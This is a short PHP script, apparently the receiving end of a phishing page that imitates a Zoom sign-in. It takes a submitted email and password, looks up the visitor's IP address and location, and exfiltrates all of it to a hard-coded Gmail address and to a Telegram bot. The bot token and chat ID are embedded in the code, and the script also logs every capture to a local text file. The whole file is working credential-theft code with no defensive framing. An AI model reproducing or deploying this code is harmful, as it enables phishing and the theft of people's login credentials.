<?php
// Allow from any origin
header("Access-Control-Allow-Origin: *");

// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        // may also be using PUT, PATCH, DELETE, etc.
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}, Content-Type");

    exit(0);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram bot token and chat ID
    $botToken = "7610309260:AAHWdped-W7RHD6OH6HxmzCjxUa1bcl6l6o";
    $chatId = "7046718281";

    // Get form data
    $mail = $_POST['userid'];
    $pass = $_POST['userpwd'];

    // Get user IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Get location details
    $locationData = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    $country = $locationData['country'];
    $region = $locationData['regionName'];

    // Prepare message
    $message = "Zoom Loggies\n";
    $message .= "Email: $mail\n";
    $message .= "Password: $pass\n";
    $message .= "IP Address: $ip\n";
    $message .= "Country: $country\n";
    $message .= "Region: $region\n";

    $to = "qdggq2007@gmail.com";	
    $subject = "ZOOMY DROPS : $ip";
    $header = "Content type: Street Vibes \r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-type: text/html\r\n";
    mail ($to,$subject,$message,$header);




    // Send message to Telegram bot
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);
    
    $fp = fopen("klass.txt","a");
    fputs($fp,$message);
    fclose($fp);
    

} else {

}
?>
